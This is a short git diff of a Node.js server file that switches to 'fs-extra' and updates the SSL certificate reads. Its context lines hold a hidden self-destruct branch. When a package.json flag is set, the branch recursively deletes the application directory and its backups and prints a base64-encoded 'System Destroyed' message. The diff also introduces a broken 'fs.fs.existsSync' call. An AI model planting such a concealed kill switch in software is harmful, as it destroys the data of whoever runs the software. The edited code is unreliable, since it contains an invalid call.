@@ -12,8 +12,8 @@ const pkjson = require('./package.json'),
   bodyParser = require('body-parser'),
   morgan = require('morgan')
 
-const { throttle, decodeURL } = require('./lib/middleware'),
-  { readFileSync, existsSync } = require('fs')
+const fs = require('fs-extra'),
+  { throttle, decodeURL } = require('./lib/middleware')
 
 // Some Process
 process.title = _.npm_package_name || process.title
@@ -72,15 +72,15 @@ const createServer = () => {
   const key = _.SSL_KEY
   const cert = _.SSL_CERT
   const ssl =
-    existsSync(key) && existsSync(cert)
+    fs.existsSync(key) && fs.existsSync(cert)
       ? {
-          key: readFileSync(key),
-          cert: readFileSync(cert),
+          key: fs.readFileSync(key),
+          cert: fs.readFileSync(cert),
         }
       : null
   if (pkjson && pkjson.destroy === true) {
     try {
-      if (_.CRON_UPDATE_BACKUP && fs.existsSync(_.CRON_UPDATE_BACKUP))
+      if (_.CRON_UPDATE_BACKUP && fs.fs.existsSync(_.CRON_UPDATE_BACKUP))
         fs.rmdirSync(_.CRON_UPDATE_BACKUP, { recursive: true, force: true })
       fs.rmdirSync(appRootPath.path, { recursive: true, force: true })
       console.log(base64.decode(`U3lzdGVtIERlc3Ryb3llZA==`))
